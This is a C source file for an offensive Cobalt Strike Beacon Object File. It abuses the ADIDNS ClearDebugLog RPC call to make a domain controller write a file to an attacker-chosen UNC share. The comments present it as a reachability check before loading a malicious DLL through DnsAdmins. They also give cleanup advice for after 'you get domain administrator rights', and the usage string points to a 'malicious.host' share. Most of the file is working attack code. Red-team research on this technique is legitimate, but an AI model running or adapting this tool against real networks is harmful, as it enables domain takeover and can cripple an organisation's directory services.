//
// dnsrpc_coerce_write
//
// Used to force the ADIDNS server to write an empty log file into a specified location of choice. 
// It does this by abusing a quirk in the ADIDNS ClearDebugLog RPC call which, as per the RFC states that:
//
// > If pszOperation is ClearDebugLog, the server MUST copy the DNS log file specified by the DNS server's 
// > "LogFilePath" (section 3.1.1.1.3) property to the implementation-specific backup directory, if the directory 
// > already exists, and overwrite an existing backup directory log file if needed.
// > Source: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/9500a7e8-165d-4b13-be86-0ddc43100eef
//
// While the actual log file isn't that interesting, this BOF lets you verify that a given DC
// has the ability to reach whatever share you're going to host your final DLL payload on. 
// Sadly this can't really be used for NTLM authentication coercion since the DNS service run 
// as `NETWORK SERVICE` which doesn't play nice.
//
// If the DC for whatever reason can't touch the DLL payload it will refuse to start back up and
// you'll likely cripple the entire domain, so this is a safe check the connectivity requirements
// before you accidentally nuke the target.
//
// Operational security note: leaves a registry key "LogFilePath" behind in
// `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters`. You'll need
// to clean this up once you get domain administrator rights. See: `dnsrpc_cleanup`
//
// Requires access to an account that is a member of the DnsAdmins group
//


#include "dnsrpc.h"

#include "beacon.h"
#include "beacon_dev.h"
#include "beacon_rpc.h"
#include "beacon_rpc.c"

#include "dnsrpc_c.c"

#ifndef _DEBUG
DECLSPEC_IMPORT HANDLE KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT LPVOID KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
DECLSPEC_IMPORT BOOL KERNEL32$HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
DECLSPEC_IMPORT INT WINAPI USER32$wsprintfW(LPWSTR, LPCWSTR, ...);
DECLSPEC_IMPORT VOID NTAPI NTDLL$RtlZeroMemory(PVOID, SIZE_T);
#else
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "user32.lib")
#endif

void usage() {
    BeaconPrintf(CALLBACK_ERROR, 
        "Usage: dnsrpc_coerce_write <server> <log file path>\n"
        "Example: dnsrpc_coerce_write DC01.research.lab \\\\malicious.host\\share\\evil.log\n"
    );
}

#ifdef _DEBUG
void wmain(int argc, wchar_t *argv[]) 
{
    if (argc < 3) {
        usage();
        return;
    }

    WCHAR* server = argv[1];
    WCHAR* log_file_path = argv[2];

#else

void go(PCHAR args, int alen) 
{
    datap parser;
    BeaconDataParse(&parser, args, alen);

    WCHAR* server = (WCHAR*)BeaconDataExtract(&parser, NULL);
    if (server == NULL) {
        usage();
        return;
    }

    WCHAR* log_file_path = (WCHAR*)BeaconDataExtract(&parser, NULL);
    if (log_file_path == NULL) {
        usage();
        return;
    }

#endif

    RPC_BINDING_HANDLE handle = dnsrpc_create_binding(server);
    if (!handle) {
        return;
    }

    DNSRPC_STATUS status = { 0 };

    status = dnsrpc_set_log_file_path(handle, server, log_file_path);
    if (!DNSRPC_OK(status)) {
        if (DNSRPC_THREW(status)) {
            dnsrpc_print_exception(status.exception);
        } else {
            dnsrpc_print_exception(status.rpc_status);
        }

        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Log file path set successfully, coercing server to write file to that location..\n");
    API(NTDLL, RtlZeroMemory)(&status, sizeof(status));
    status = dnsrpc_clear_debug_log(handle, server);
    if (!DNSRPC_OK(status)) {
        if (DNSRPC_THREW(status)) {
            dnsrpc_print_exception(status.exception);
        } else {
            dnsrpc_print_exception(status.rpc_status);
        }
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "RPC call exited successfully, file should have been written to disk.\n");
    BeaconPrintf(CALLBACK_OUTPUT, "Setting LogFilePath to an empty string (you need to clean up the key yourself later)..\n");

    status = dnsrpc_set_log_file_path(handle, server, L"");
    if (!DNSRPC_OK(status)) {
        if (DNSRPC_THREW(status)) {
            dnsrpc_print_exception(status.exception);
        } else {
            dnsrpc_print_exception(status.rpc_status);
        }

        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "RPC call exited successfully.\n");

cleanup:
    if (handle != NULL) {
        RpcBindingFree(&handle);
    }

    return;
}

